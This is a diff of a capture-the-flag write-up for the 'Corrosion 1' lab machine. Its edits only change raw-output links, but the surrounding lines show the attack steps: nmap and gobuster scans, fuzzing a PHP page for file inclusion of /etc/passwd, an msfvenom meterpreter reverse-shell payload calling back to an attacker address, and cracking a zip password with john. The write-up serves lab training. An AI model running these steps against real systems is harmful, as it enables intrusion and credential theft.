@@ -15,7 +15,7 @@ status: "complete"
 
 <TerminalOutput
   cmd="nmap -A -T5 10.0.0.103"
-  rawHref="/writeups/raw/corrosion-1/nmap.txt"
+  rawHref="/writeups/raw/corrosion-1/nmap"
   output={`PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1
 80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
@@ -32,7 +32,7 @@ Gobuster on the root finds two directories worth looking at.
 
 <TerminalOutput
   cmd="gobuster dir -w raft-large-directories.txt -u http://10.0.0.103"
-  rawHref="/writeups/raw/corrosion-1/gobuster.txt"
+  rawHref="/writeups/raw/corrosion-1/gobuster"
   output={`tasks      (Status: 301) [--> http://10.0.0.103/tasks/]
 blog-post  (Status: 301) [--> http://10.0.0.103/blog-post/]`}
 />
@@ -66,7 +66,7 @@ Fuzz the parameter name on `randylogs.php`:
 
 <TerminalOutput
   cmd={`gobuster fuzz -w common.txt -u "http://10.0.0.103/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" --exclude-length 0`}
-  rawHref="/writeups/raw/corrosion-1/gobuster-lfi.txt"
+  rawHref="/writeups/raw/corrosion-1/gobuster-lfi"
   output={`[Status=200] [Length=2832] [Word=file]`}
 />
 
@@ -134,7 +134,7 @@ Shell catches as `www-data`. From here, upgrade to a meterpreter session:
 
 <TerminalOutput
   cmd="msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.52 LPORT=9001 -f elf -o reverse.elf"
-  rawHref="/writeups/raw/corrosion-1/msfvenom.txt"
+  rawHref="/writeups/raw/corrosion-1/msfvenom"
   output={`Payload size: 130 bytes
 Final size of elf file: 250 bytes
 Saved as: reverse.elf`}
@@ -164,7 +164,7 @@ It's password-protected. Convert it and crack with rockyou:
 
 <TerminalOutput
   cmd="zip2john user_backup.zip > zipjohn.txt && john --wordlist=rockyou.txt zipjohn.txt"
-  rawHref="/writeups/raw/corrosion-1/zip-crack.txt"
+  rawHref="/writeups/raw/corrosion-1/zip-crack"
   output={`!randybaby  (user_backup.zip)`}
 />
 
